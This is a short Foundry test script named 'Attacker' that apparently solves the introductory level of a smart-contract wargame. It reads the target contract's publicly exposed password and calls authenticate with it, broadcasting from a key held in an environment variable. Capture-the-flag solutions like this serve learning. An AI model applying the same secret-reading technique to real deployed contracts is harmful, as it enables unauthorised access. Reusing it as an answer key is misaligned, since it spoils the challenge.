// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Level0.sol";
import "forge-std/Test.sol";

contract Attacker is Test {
    Level0 level0 = Level0(0x526D5B7395100F7FD927bE04DdFC2750d28FeA0b);

    function test() external{

        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        level0.authenticate(level0.password()); //call authenticate function with the password
        vm.stopBroadcast();
    }

}